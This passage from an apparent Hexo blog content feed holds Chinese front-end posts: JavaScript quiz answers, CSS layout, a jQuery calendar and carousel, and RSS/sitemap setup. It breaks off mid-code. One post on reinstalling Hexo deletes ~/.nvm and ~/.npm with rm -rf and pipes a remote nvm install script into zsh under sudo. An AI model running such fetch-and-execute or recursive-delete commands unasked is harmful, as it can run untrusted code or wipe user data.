</span>&#123;</span><br><span class="line">    <span class="comment">/* Act on the event */</span></span><br><span class="line">    $(<span class="keyword">this</span>).attr(<span class="string">'placeholder'</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">'#textarea'</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="keyword">this</span>).attr(<span class="string">'placeholder'</span>,$textareaPlaceholderText);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>原版的javascript居然想了半天才写出来：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea id=<span class="string">"textarea"</span> placeholder=<span class="string">"123123123"</span> onfocus=<span class="string">"onf()"</span> onblur=<span class="string">"onb()"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">var ta = document.getElementById('textarea'),</span></span><br><span class="line"><span class="regexp">te = ta.getAttribute('placeholder');</span></span><br><span class="line"><span class="regexp">function onf()&#123;</span></span><br><span class="line"><span class="regexp">    ta.setAttribute('placeholder','');</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">function onb()&#123;</span></span><br><span class="line"><span class="regexp">    ta.setAttribute('placeholder',te);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></p><hr><h1 id="No-7"><a href="#No-7" class="headerlink" title="No.7"></a>No.7</h1><blockquote><p>alert(Function instanceof Object); // true<br>alert(Object instanceof Function); // ture</p></blockquote><p>show you the codes:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="keyword">typeof</span>(<span class="number">1</span>)); <span class="comment">//number</span></span><br><span class="line">alert(<span class="keyword">typeof</span>(<span class="string">"abc"</span>)); <span class="comment">//string</span></span><br><span class="line">alert(<span class="keyword">typeof</span>(<span class="literal">true</span>)); <span class="comment">//boolean</span></span><br><span class="line">alert(<span class="keyword">typeof</span>(<span class="number">2009</span> - <span class="number">2</span> - <span class="number">4</span>)); <span class="comment">//number，equals 2004 </span></span><br><span class="line">alert(<span class="keyword">typeof</span>(<span class="string">"2009-2-4"</span>)); <span class="comment">//string</span></span><br><span class="line">alert(<span class="keyword">typeof</span>(m)); <span class="comment">//undefined</span></span><br><span class="line"><span class="comment">/*--------d is a Date--------*/</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">alert(<span class="keyword">typeof</span>(d)); <span class="comment">//object</span></span><br><span class="line"><span class="comment">/*--------Person is a function--------*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">alert(<span class="keyword">typeof</span>(Person)); <span class="comment">//function</span></span><br><span class="line"><span class="comment">/*--------a is an array--------*/</span></span><br><span class="line">a = <span class="keyword">new</span> <span class="built_in">Array</span>([]);</span><br><span class="line">alert(<span class="keyword">typeof</span>(a)); <span class="comment">//object</span></span><br><span class="line"><span class="comment">/*--------x instanceof y--------*/</span></span><br><span class="line">alert(a <span class="keyword">instanceof</span> <span class="built_in">Array</span>);</span><br><span class="line"><span class="keyword">var</span> h = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line">alert(Person <span class="keyword">instanceof</span> <span class="built_in">Function</span>); <span class="comment">//true</span></span><br><span class="line">alert(h <span class="keyword">instanceof</span> <span class="built_in">Object</span>); <span class="comment">//true</span></span><br><span class="line">alert(o <span class="keyword">instanceof</span> <span class="built_in">Object</span>); <span class="comment">//true</span></span><br><span class="line">alert(<span class="keyword">typeof</span>(h)); <span class="comment">//object</span></span><br></pre></td></tr></table></figure></p><p>注意，构造时的大写<code>Object</code>和<code>Function</code>都是<code>函数</code>类型。<br><strong>但是</strong>，实例化的函数都是<code>object</code>类型，实例化之前是<code>undefined</code>。  </p><hr><h1 id="No-8"><a href="#No-8" class="headerlink" title="No.8"></a>No.8</h1><p>首先看答案：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m1 = main();</span><br><span class="line">foo: <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">this</span>.foo: <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m1 = <span class="keyword">new</span> main();</span><br><span class="line">foo: <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">this</span>.foo: <span class="literal">undefined</span></span><br></pre></td></tr></table></figure></p><p>不知道怎么解释呢。。。<br><strong>私以为</strong>第一个值是<code>undefined</code>的原因是<code>main</code>内重新申明了相同名的变量，从而覆盖了外部的变量，所以是<code>undefined</code>。<br>第二个值在指向全局变量，所以第一个值是<code>1</code>，但是第二个是<code>new</code>的，不再是全局的，所以也是没有定义<code>undefined</code>。</p><hr><h1 id="No-9"><a href="#No-9" class="headerlink" title="No.9"></a>No.9</h1><p>还是css简单。。。<br>shut up and give you the code:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"screen"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.header</span>, <span class="selector-class">.sidebar</span>, <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="undefined">    height: 50px;</span></span><br><span class="line"><span class="undefined">    margin: 1px 0;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 100%;</span></span><br><span class="line"><span class="undefined">    background-color: red;</span></span><br><span class="line"><span class="undefined">    display: block;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.sidebar</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 200px;</span></span><br><span class="line"><span class="undefined">    background-color: green;</span></span><br><span class="line"><span class="undefined">    display: inline-block;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: calc(100% - 204px);</span></span><br><span class="line"><span class="undefined">    background-color: blue;</span></span><br><span class="line"><span class="undefined">    display: inline-block;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css">@<span class="keyword">media</span> screen and (max-width:<span class="number">600px</span>) &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.sidebar</span>, <span class="selector-class">.content</span>, <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="undefined">        width: 100%;</span></span><br><span class="line"><span class="undefined">        display: inline-block;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>header<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sidebar"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>sidebar<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>content<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>只有一个问题，Safari里面貌似<code>inline-block</code>自带了有<code>margin: 1px;</code>，然后上面就要减去204。<br>然而在Chrome里面就变成了206，Firefox又是205。<br>这里规定了html格式的，不然就可以用flex。<br>父元素设置<code>display: flex; flex-flow: row;</code>，子元素设置就可以flex/space-between/flex-grow解决了。<br>可能这道题的考点是<code>@media screen and (max-width: 600px)</code>？  </p><hr><h1 id="No-10"><a href="#No-10" class="headerlink" title="No.10"></a>No.10</h1><p>本来还说先遍历网页上的所有链接放数组里，然后每一个点击的时候都<code>indexOf</code>找一下。<br>看了标答我就震惊了，居然js自带了这个数组了：<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">window.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> &#123;</span></span><br><span class="line">var l = document.links.<span class="built_in">length</span>;</span><br><span class="line"><span class="keyword">for</span> (var <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt; l; <span class="built_in">i</span>++) &#123;</span><br><span class="line">document.links[<span class="built_in">i</span>].onclick = <span class="function"><span class="keyword">function</span><span class="params">(x)</span> &#123;</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> &#123;</span></span><br><span class="line">alert(x + <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125; (<span class="built_in">i</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>这里注意一下最里面<strong>用了一个闭包传x的值</strong>，for循环里面经常出这样的错误，你以为会每一次都会不一样，naive，直接输出，结果都一样。<br>还有就是不要忘了function定义之后加<code>(参数)</code>相当于执行。  </p><hr><p>未完待续  </p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>花了好长时间重装了Hexo</title>
      <link href="/2016/03-23-reInstallHexo/"/>
      <url>/2016/03-23-reInstallHexo/</url>
      
        <content type="html"><![CDATA[<p>今天使用hexo的时候，发现找不到这个命令了<br>打开finder，我的hexo文件夹还在那里<br>当时并不知道是哪个地方出问题了<br>就只是简单的在zshrc文件中添加了<code>hexo bin</code>文件的alias<br>但是今天在deploy新文章的时候，发现hexo彻底不能用了    </p><h1 id="问题哪里来的"><a href="#问题哪里来的" class="headerlink" title="问题哪里来的"></a>问题哪里来的</h1><p>我昨天添加hexo sitemap插件的时候<br>顺手更改了nvm，并且没有配置好<br>导致系统使用的node版本中没有hexo<br>我在找到这个问题的途中尝试了重装npm<br>不幸的是npm问题更多，err红了一大片<br>在中间等待和<code>ctrl c</code>的多次循环中我选择了放弃  </p><h1 id="重装"><a href="#重装" class="headerlink" title="重装"></a>重装</h1><p>先备份，就是把hexo文件夹改个名字，比如说<code>hexo1</code><br>卸载nvm：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.nvm</span><br><span class="line">rm -rf ~/.npm</span><br><span class="line">rm -rf ~/.bower</span><br></pre></td></tr></table></figure></p><p>然后重新装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | zsh</span><br></pre></td></tr></table></figure></p><p>然后重新装hexo：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo-cli -g</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure></p><p>还有之前的各种hexo插件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure></p><p>然后把之前备份的source文件夹，配置文件<code>_config.yml</code>，theme文件<br>都拷贝进去 </p><h1 id="这个故事告诉我们"><a href="#这个故事告诉我们" class="headerlink" title="这个故事告诉我们"></a>这个故事告诉我们</h1><p>好好等，不要胡乱<code>ctrl c</code><br>然后时常备份，要会看报错信息  </p><hr>]]></content>
      
      
      <categories>
          
          <category> 麦客爱苹果 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JQuery实现简单日历组件</title>
      <link href="/2016/03-23-calender/"/>
      <url>/2016/03-23-calender/</url>
      
        <content type="html"><![CDATA[<p><a href="http://gaoryrt.com/CV/calendar/index.html">demo点这里</a></p><h1 id="需要达到的效果"><a href="#需要达到的效果" class="headerlink" title="需要达到的效果"></a>需要达到的效果</h1><p>常见的日历组件<br>从上到下是左右按键、年月、周标题、日期<br>点击左右按键可以跳月份<br>第一个版本就不谢其他东西了<br>能看到今天几号，某一天是周几这样  </p><h1 id="大概思路"><a href="#大概思路" class="headerlink" title="大概思路"></a>大概思路</h1><p>先获得当前年月，这个月几天<br>然后算这个月一号周几<br>放好位置后，后面连着放好即可<br>主要函数就是一个放日期</p><h1 id="首先是html"><a href="#首先是html" class="headerlink" title="首先是html"></a>首先是html</h1><p><code>div.wrapper&gt;title+img.prev+img.next&gt;(ul.week.w$&gt;li.date$*7)*7</code><br>七个week，第一个是用来放周一到周日的标志的<br>后面的六行刚好可以放分割最长的一周  </p><h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><p>需要注意的是，我用了<code>inline-block</code>来放置所有的日期项<br>有个关于<code>inline-blick</code>的问题就是上下不一定会对齐<br>那么这里就要把每一个项目都设置一个<code>max-height</code>而非只是<code>height</code>  </p><h1 id="js"><a href="#js" class="headerlink" title="js"></a>js</h1><p>页面加载时生成本月，<code>prev</code>的上一月，<code>next</code>的下一月<br>都是围绕着一个函数<code>putMonth(year, month)</code><br>通过年月改变项目数字<br>这个函数也有几个注意的点<br>一是判断闰年：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var isleap = <span class="literal">false</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">year</span> % <span class="number">4</span> === <span class="number">0</span> &amp;&amp; <span class="built_in">year</span> % <span class="number">100</span> != <span class="number">0</span>) || <span class="built_in">year</span> % <span class="number">400</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        isleap = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>二是通过闰年判断该月的天数：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var <span class="attr">monthNum</span> = <span class="number">31</span></span><br><span class="line"><span class="keyword">if</span> (<span class="attr">month</span> === <span class="number">4</span> || <span class="attr">month</span> === <span class="number">6</span> || <span class="attr">month</span> === <span class="number">9</span> || <span class="attr">month</span> === <span class="number">11</span>) &#123;</span><br><span class="line">        <span class="attr">monthNum</span> = <span class="number">30</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="attr">month</span> === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isleap) &#123;</span><br><span class="line">            <span class="attr">monthNum</span> = <span class="number">29</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="attr">monthNum</span> = <span class="number">28</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>三是循环填充的开始点：<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            putDate(dayNum, <span class="built_in">row</span>, week01)</span><br><span class="line">            dayNum++</span><br><span class="line">            week01++</span><br><span class="line">        &#125; <span class="keyword">while</span> (week01 &lt; <span class="number">8</span> &amp;&amp; dayNum &lt;= monthNum)</span><br><span class="line">        <span class="built_in">row</span>++</span><br><span class="line">        week01 = <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">row</span> &lt;= <span class="number">6</span> &amp;&amp; dayNum &lt;= monthNum)</span><br></pre></td></tr></table></figure></p><p>这里用do-while而非for<br>还有就是两个需要自己调一调的地方：<br>getMonth()获得的是从零开始的月份<br><code>var month = now.getMonth() + 1</code><br>getDay()获得的是从零开始的日期<br><code>var week01 = new Date(year + &#39;/&#39; + month + &#39;/&#39; + &#39;0&#39;).getDay() + 1</code><br>另外两个按键就简单了  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>为站点添加Rss和sitemap</title>
      <link href="/2016/03-22-addrss/"/>
      <url>/2016/03-22-addrss/</url>
      
        <content type="html"><![CDATA[<h1 id="rss是什么"><a href="#rss是什么" class="headerlink" title="rss是什么"></a>rss是什么</h1><p>全称是really simple syndication<br>简易信息聚合<br>以下是个人YY<br>在我国，有新浪微博、微信公众号、各路新闻/聚合软件瓜分市场的大前提下<br>你要好好使用一个rss还是蛮不容易的<br>不说rss阅读器的选择，单单是订阅和迁移订阅源的过程就够繁琐的了<br>新浪微博可以推荐相似用户，公众号有钱拿<br>rss确实做下去不容易  </p><hr><h1 id="为hexo添加rss"><a href="#为hexo添加rss" class="headerlink" title="为hexo添加rss"></a>为hexo添加rss</h1><p>hexo的plugin页面就有相应插件<br>配置也相当简单<br><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">点这里看原文</a><br>安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure></p><p>配置，在<code>hexo/_config.yml</code>里添加：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">feed</span>:</span><br><span class="line">  <span class="selector-tag">type</span>: <span class="selector-tag">rss2</span></span><br><span class="line">  <span class="selector-tag">path</span>: <span class="selector-tag">rss2</span><span class="selector-class">.xml</span></span><br><span class="line">  <span class="selector-tag">limit</span>: 20</span><br><span class="line">  <span class="selector-tag">hub</span>:</span><br></pre></td></tr></table></figure></p><p>然后把rss连接放在<code>theme/_config.yml</code>中：<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">rss:</span> /rss2.xml</span><br></pre></td></tr></table></figure></p><p>然后<code>generate</code>，再<code>deploy</code>就行了</p><hr><h1 id="为hexo添加sitemap"><a href="#为hexo添加sitemap" class="headerlink" title="为hexo添加sitemap"></a>为hexo添加sitemap</h1><p>hexo的plugin页面就有相应插件<br>配置也相当简单<br><a href="https://github.com/ludoviclefevre/hexo-generator-seo-friendly-sitemap" target="_blank" rel="noopener">点这里看原文</a><br>安装：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-seo-friendly-sitemap --save</span><br></pre></td></tr></table></figure></p><p>配置，在<code>hexo/_config.yml</code>里添加：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sitemap:</span></span><br><span class="line"><span class="symbol">    path:</span> sitemap.xml</span><br></pre></td></tr></table></figure></p><p>然后就可以拿给搜索引擎了</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JQuery实现简单的轮播图</title>
      <link href="/2016/03-21-shuffle/"/>
      <url>/2016/03-21-shuffle/</url>
      
        <content type="html"><![CDATA[<p><a href="http://gaoryrt.com/CV/shuffle/index.html">demo点这里</a></p><h1 id="需要达到的效果"><a href="#需要达到的效果" class="headerlink" title="需要达到的效果"></a>需要达到的效果</h1><p>常见的轮播图组件<br>自动翻页，左右跳转按钮，下方是index<br>index显示了当前图片位置，左右按钮就是更改当前位置<br>第一个版本暂时不定义api了，写简单点  </p><h1 id="大概思路"><a href="#大概思路" class="headerlink" title="大概思路"></a>大概思路</h1><p>用banner隐藏超出部分的图片<br>imageList是inline<br>要显示的话就float到标签位置      </p><h1 id="首先是html"><a href="#首先是html" class="headerlink" title="首先是html"></a>首先是html</h1><p>从sublime换了webstorm，自带了emmet插件<br>也就是可以这样写<br><code>div.wrapper&gt;div.banner&gt;ul.imageList&gt;(li&gt;img)*4^img+img&gt;ul.indexList&gt;(li&gt;img)*4</code><br><code>tab</code>之后就是这个效果了：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"banner"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"imageList"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"indexList"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>emmet还是挺方便的  </p><h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><p>为了使banner遮挡其他元素，overflow:hidden<br>然后 imgList的li 全部都float:left,display:inline<br>这样的话就可以在后面左右滑了<br>左右按键和indexList需要用position:absolute来定位<br>这俩就用绝对值50%再margin一个负值来居中  </p><h1 id="jquery"><a href="#jquery" class="headerlink" title="jquery"></a>jquery</h1><p>主要是通过一个changeTo()来完成到指定图片的跳转<br>三个直接事件：自动换、点击左右、点击indexList<br>都是对changeTo()的不同调用：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeTo</span>(<span class="params">num</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> goLeft = num * <span class="number">800</span>;</span><br><span class="line">    $(<span class="string">".imgList"</span>).animate(&#123;<span class="attr">left</span>: <span class="string">"-"</span> + goLeft + <span class="string">"px"</span>&#125;,<span class="number">500</span>);</span><br><span class="line">    $(<span class="string">".indexList"</span>).find(<span class="string">"li"</span>).removeClass(<span class="string">"indexOn"</span>).eq(num).addClass(<span class="string">"indexOn"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>还有就是通过设置全局变量的方法来添加一个循环：<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var autoChange = setInterval(<span class="function"><span class="keyword">function</span></span> () &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">index</span>&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">index</span>++</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">index</span>=<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    changeTo(<span 